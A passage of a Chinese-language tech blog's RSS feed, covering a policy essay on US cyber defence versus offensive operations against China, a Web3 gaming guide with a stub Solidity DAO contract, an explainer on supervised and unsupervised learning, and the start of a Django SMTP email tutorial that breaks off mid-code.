&lt;/h3&gt;&lt;p&gt;在某种程度上，美国几乎与中国完全相反，其政府形式非常刻意地设计为避免集中和不受制约的权力。宪法将一些权力委托给联邦政府，而其他权力则保留给各州。然后在联邦层面和大多数州，政府分为独立的行政、立法和司法部门。&lt;/p&gt;
&lt;p&gt;这种对权力的分离导致数百个不同的联邦机构拥有不同但有时重叠的权限，这在大多数情况下运作得相当好，尽管效率极低。然而，网络攻击影响一切。从发电站到银行，州到联邦政府系统，国内公司和国际企业，间谍活动和战争。&lt;/p&gt;
&lt;p&gt;那么在美国，网络安全是谁的责任？没有人，也是每个人。没有中央机构来监管网络安全，每个人基本上都要为自己的房子负责。本应是全面的国家网络安全立法和国家网络防御能力的东西，只是一个分散的生态系统，分布在私营行业、监管机构以及从地方到联邦的各级政府之间。&lt;/p&gt;
&lt;h2 id=&#34;注定失败的计划&#34;&gt;注定失败的计划
&lt;/h2&gt;&lt;p&gt;我个人认为，试图通过进攻性网络行动来威慑中国不仅不会成功，而且是一个巨大的错误。我并不是说美国应该向中国低头，或者它不应该能够自卫，只是说在没有防御能力支持的情况下增加进攻性网络行动是一个可怕的想法。&lt;/p&gt;
&lt;h2 id=&#34;在舆论战争中网络力量开辟了一个全新的战线&#34;&gt;在舆论战争中，网络力量开辟了一个全新的战线
&lt;/h2&gt;&lt;p&gt;当你看看美国参与的以往战争时，很明显，击败美国军队从来都不现实也不可能，但一个可行的策略就是等待他们退出。从越南到阿富汗，有很多这样的例子。最终，公众对战争失去兴趣，美国撤军。&lt;/p&gt;
&lt;p&gt;最近，所有人的目光都集中在乌克兰。协助乌克兰防御俄罗斯对美国来说既是道德立场，也是战略有利立场。以不到美国GDP百分之一的成本，美国能够阻止非法入侵，摧毁大部分俄罗斯军队，并通过国际制裁削弱俄罗斯经济。然而，仅仅三年后，公众舆论就已经崩溃。多年的无端全球干预和国内不稳定已经使公众舆论退回到孤立主义。&lt;/p&gt;
&lt;p&gt;鉴于中国入侵台湾的野心，他们可能一直在密切关注。似乎公众对外国战争甚至军事援助的支持，无论是否合理，几乎为零。当我们深入研究美国人观点背后的一些原因时，很多都归结为他们对自己感知的安全和稳定的日益关注。&lt;/p&gt;
&lt;p&gt;这使得中国破坏美国基础设施的能力变得更加宝贵。他们很可能不仅将其视为威慑，也视为削弱公众对任何干预支持的手段。因此，美国需要施加的成本来迫使中国放弃这些能力可能是无限的。&lt;/p&gt;
&lt;h2 id=&#34;美国需要认真努力制定网络安全立法&#34;&gt;美国需要认真努力制定网络安全立法
&lt;/h2&gt;&lt;p&gt;虽然我要重申，我并不是说美国不能也不应该自卫，或者在不久的将来不能采取进攻行动，但政策制定者需要在没有适当的防御框架的情况下承诺增加进攻性网络行动之前深思熟虑。&lt;/p&gt;
&lt;p&gt;目前，美国：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;没有任何有效的网络安全立法。&lt;/li&gt;
&lt;li&gt;没有一个强大的中央组织能够快速或轻松地解决网络安全缺陷。&lt;/li&gt;
&lt;li&gt;没有能力修复已经发生的网络攻击。&lt;/li&gt;
&lt;li&gt;基础设施极其分散、过时且难以防御。&lt;/li&gt;
&lt;li&gt;在技术上比中国依赖得多。&lt;/li&gt;
&lt;li&gt;在社会和文化上都对重大网络攻击或经济破坏毫无准备。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;此外，将网络安全责任下放给各州的提议简直是无稽之谈。大多数州既没有资金、资源，也没有动力来实施有效的网络安全立法和控制。网络安全是一个具有国家后果的国家问题，而不是可以因州而异的问题。&lt;/p&gt;
&lt;h2 id=&#34;前进方向&#34;&gt;前进方向
&lt;/h2&gt;&lt;p&gt;在一个完美的世界里，我们不会期望公司防御其网络免受国家支持的网络攻击，就像我们不会期望他们建立防空系统来防御导弹袭击一样。但是，如果做不到这一点，我们至少可以考虑一些有意义的网络安全立法，以降低中小型企业的成本，并提高对资金充足的企业的期望。&lt;/p&gt;
&lt;p&gt;还有许多问题可以更接近源头解决。立法工作越多地投入到使软件和设备在设计上更安全，每个人处理后果的成本就越低。公司不应该因为物联网设备制造商想将默认密码设置为&amp;quot;password&amp;quot;而不得不抵御破纪录的DDoS攻击。&lt;/p&gt;
&lt;p&gt;美国不需要拥有完美的网络防御，但如果政策制定者希望将进攻性网络行动作为一种威慑形式，就需要开始投入更多努力通过全面的网络安全立法。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web3游戏完全指南：游戏平台的未来</title>
        <link>http://localhost:1313/p/web3%E6%B8%B8%E6%88%8F%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%E6%B8%B8%E6%88%8F%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%9C%AA%E6%9D%A5/</link>
        <pubDate>Mon, 04 Aug 2025 08:47:07 +0800</pubDate>
        
        <guid>http://localhost:1313/p/web3%E6%B8%B8%E6%88%8F%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97%E6%B8%B8%E6%88%8F%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%9C%AA%E6%9D%A5/</guid>
        <description>&lt;h1 id=&#34;web3游戏完全指南游戏平台的未来&#34;&gt;Web3游戏完全指南：游戏平台的未来
&lt;/h1&gt;&lt;h2 id=&#34;什么是web3游戏&#34;&gt;什么是Web3游戏？
&lt;/h2&gt;&lt;p&gt;Web3游戏是基于去中心化技术构建的新型游戏范式。与传统游戏不同，Web3游戏通过区块链技术实现玩家对游戏资产的真实所有权（NFT形式），允许玩家参与游戏项目治理，并能直接从游戏活动中获得经济收益。&lt;/p&gt;
&lt;h2 id=&#34;web3游戏与传统游戏的技术对比&#34;&gt;Web3游戏与传统游戏的技术对比
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;对比维度&lt;/th&gt;
          &lt;th&gt;传统游戏&lt;/th&gt;
          &lt;th&gt;Web3游戏&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;资产所有权&lt;/td&gt;
          &lt;td&gt;开发商集中控制&lt;/td&gt;
          &lt;td&gt;玩家通过NFT真正拥有资产&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;交易自由度&lt;/td&gt;
          &lt;td&gt;受平台严格限制&lt;/td&gt;
          &lt;td&gt;基于区块链的自由交易&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;系统透明度&lt;/td&gt;
          &lt;td&gt;封闭的中心化服务器&lt;/td&gt;
          &lt;td&gt;链上可验证的透明记录&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;治理参与度&lt;/td&gt;
          &lt;td&gt;开发商单边决策&lt;/td&gt;
          &lt;td&gt;DAO机制下的玩家投票治理&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;经济模型&lt;/td&gt;
          &lt;td&gt;单向消费型&lt;/td&gt;
          &lt;td&gt;Play-to-Earn双向经济循环&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;跨平台兼容性&lt;/td&gt;
          &lt;td&gt;资产锁定单一游戏&lt;/td&gt;
          &lt;td&gt;支持跨游戏资产互通&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;数据安全性&lt;/td&gt;
          &lt;td&gt;单点故障风险&lt;/td&gt;
          &lt;td&gt;分布式账本保障资产安全&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;核心技术架构&#34;&gt;核心技术架构
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;区块链底层&lt;/strong&gt;：采用以太坊等公链作为结算层，确保交易不可篡改&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;智能合约&lt;/strong&gt;：用Solidity编写游戏核心逻辑，实现自动化规则执行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NFT标准&lt;/strong&gt;：遵循ERC-721/1155协议实现游戏资产代币化&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;去中心化存储&lt;/strong&gt;：使用IPFS存储NFT元数据，保证资产永久可访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Layer2扩展&lt;/strong&gt;：集成Polygon等解决方案解决Gas费问题&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;dao治理实现方案&#34;&gt;DAO治理实现方案
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 示例：基于ERC-20的治理合约片段
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;GameDAO&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;mapping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;uint256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;votingPower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;createProposal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_description&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;votingPower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 提案创建逻辑
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;vote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;uint256&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proposalId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;support&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;votingPower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 投票计票逻辑
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;经济系统设计要点&#34;&gt;经济系统设计要点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;双代币模型（治理代币+实用代币）&lt;/li&gt;
&lt;li&gt;动态通胀/通缩机制&lt;/li&gt;
&lt;li&gt;NFT铸造销毁算法&lt;/li&gt;
&lt;li&gt;交易手续费再分配&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;scand的技术服务&#34;&gt;SCAND的技术服务
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;全栈开发&lt;/strong&gt;：Unity/Unreal引擎与Web3.js集成&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;智能合约审计&lt;/strong&gt;：采用MythX等工具进行安全检测&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨链桥接&lt;/strong&gt;：实现多链资产互通&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;去中心化匹配系统&lt;/strong&gt;：基于状态通道技术&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;安全实践&#34;&gt;安全实践
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;重入攻击防护&lt;/li&gt;
&lt;li&gt;随机数生成方案&lt;/li&gt;
&lt;li&gt;前端防钓鱼措施&lt;/li&gt;
&lt;li&gt;冷热钱包分离管理&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;市场数据显示，Web3游戏市场规模预计将从2024年的67.1亿美元增长至2034年的1183.6亿美元，年复合增长率达33.23%，技术革新正在重塑游戏产业格局。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>监督学习与无监督学习：机器学习技术解析与应用实例</title>
        <link>http://localhost:1313/p/%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/</link>
        <pubDate>Mon, 04 Aug 2025 08:30:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B/</guid>
        <description>&lt;h1 id=&#34;监督学习-vs-无监督学习关键差异与实例&#34;&gt;监督学习 vs 无监督学习：关键差异与实例
&lt;/h1&gt;&lt;h2 id=&#34;人工智能的现实应用&#34;&gt;人工智能的现实应用
&lt;/h2&gt;&lt;p&gt;人工智能已突破科幻范畴，现今能实现商品推荐、消费者行为分析、欺诈识别甚至销售预测。这些功能都依赖于机器学习算法——这种技术使计算机能够基于数据自主&amp;quot;思考&amp;quot;而非仅执行指令。&lt;/p&gt;
&lt;p&gt;全球机器学习市场规模已超600亿美元，企业正深度依赖智能系统保持竞争优势。无论流程自动化、客户体验优化还是新增长机会挖掘，理解机器学习工作原理都至关重要。&lt;/p&gt;
&lt;h2 id=&#34;监督学习详解&#34;&gt;监督学习详解
&lt;/h2&gt;&lt;p&gt;监督学习通过带标注的训练数据教会计算机识别模式并做出决策。其工作流程包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入带明确标签的数据集（如客户复购标记/垃圾邮件分类）&lt;/li&gt;
&lt;li&gt;算法学习数据中的特征规律&lt;/li&gt;
&lt;li&gt;构建预测模型应用于新数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;典型应用场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;金融欺诈交易检测（比对历史欺诈模式）&lt;/li&gt;
&lt;li&gt;零售销量预测（分析季节趋势/用户行为）&lt;/li&gt;
&lt;li&gt;医疗辅助诊断（处理影像/检验报告）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;无监督学习机制&#34;&gt;无监督学习机制
&lt;/h2&gt;&lt;p&gt;无监督学习直接探索原始数据的内在结构，主要技术包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;聚类分析（如客户价值自动分群）&lt;/li&gt;
&lt;li&gt;降维处理（提取关键影响因子）&lt;/li&gt;
&lt;li&gt;异常检测（识别非常规模式）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;核心优势在于无需预定义标签即可发现隐藏规律，适用于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;营销中的客户细分&lt;/li&gt;
&lt;li&gt;网络安全异常行为识别&lt;/li&gt;
&lt;li&gt;社交媒体的舆情分析&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术对比矩阵&#34;&gt;技术对比矩阵
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;维度&lt;/th&gt;
          &lt;th&gt;监督学习&lt;/th&gt;
          &lt;th&gt;无监督学习&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;数据要求&lt;/td&gt;
          &lt;td&gt;需标注数据集&lt;/td&gt;
          &lt;td&gt;原始非结构化数据&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;算法示例&lt;/td&gt;
          &lt;td&gt;决策树/SVM/神经网络&lt;/td&gt;
          &lt;td&gt;K-means/DBSCAN/PCA&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;输出结果&lt;/td&gt;
          &lt;td&gt;明确预测值或分类标签&lt;/td&gt;
          &lt;td&gt;数据内在结构可视化&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;评估指标&lt;/td&gt;
          &lt;td&gt;准确率/召回率/F1值&lt;/td&gt;
          &lt;td&gt;轮廓系数/惯性指标&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;混合学习方法&#34;&gt;混合学习方法
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;半监督学习：融合少量标注数据与大量未标注数据&lt;/li&gt;
&lt;li&gt;强化学习：通过奖励机制实现渐进式优化（应用于机器人控制/游戏AI等）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;企业实施建议&#34;&gt;企业实施建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;明确业务目标（预测需求选监督/探索模式选无监督）&lt;/li&gt;
&lt;li&gt;评估数据现状（标注完善程度/数据量级）&lt;/li&gt;
&lt;li&gt;采用迭代开发模式（从POC逐步扩展到生产环境）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术实施服务&#34;&gt;技术实施服务
&lt;/h2&gt;&lt;p&gt;专业团队可提供：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定制化模型开发&lt;/li&gt;
&lt;li&gt;行业解决方案适配&lt;/li&gt;
&lt;li&gt;全生命周期管理（从数据清洗到模型部署）&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;正确选择学习范式直接影响AI项目 ROI。建议初期通过概念验证(POC)评估不同方法在具体业务场景中的适用性。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>使用Django通过SMTP服务器发送电子邮件的完整指南</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8django%E9%80%9A%E8%BF%87smtp%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/</link>
        <pubDate>Mon, 04 Aug 2025 08:19:36 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8django%E9%80%9A%E8%BF%87smtp%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;如何通过django使用smtp服务器发送邮件&#34;&gt;如何通过Django使用SMTP服务器发送邮件
&lt;/h1&gt;&lt;h2 id=&#34;关键要点&#34;&gt;关键要点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;配置SMTP设置&lt;/strong&gt;：在settings.py中设置EMAIL_BACKEND、EMAIL_HOST等参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用Django Environ保护凭证&lt;/strong&gt;：通过环境变量管理敏感信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;生成应用专用密码&lt;/strong&gt;：为Gmail启用两步验证并创建应用密码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;send_mail函数&lt;/strong&gt;：使用Django内置函数发送邮件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;构建自动联系表单&lt;/strong&gt;：集成Django表单与邮件发送功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;smtp服务器工作原理&#34;&gt;SMTP服务器工作原理
&lt;/h2&gt;&lt;p&gt;SMTP（简单邮件传输协议）是发送电子邮件的标准协议。Gmail的SMTP服务器地址为smtp.gmail.com，端口587。&lt;/p&gt;
&lt;h2 id=&#34;创建django项目&#34;&gt;创建Django项目
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m venv .venv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; .venv/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install django
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;django-admin startproject EmailProject
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;配置django邮件后端&#34;&gt;配置Django邮件后端
&lt;/h2&gt;&lt;p&gt;在settings.py中添加：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_BACKEND&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;django.core.mail.backends.smtp.EmailBackend&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_HOST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;EMAIL_HOST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 从环境变量读取&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_PORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;587&lt;/span&gt;
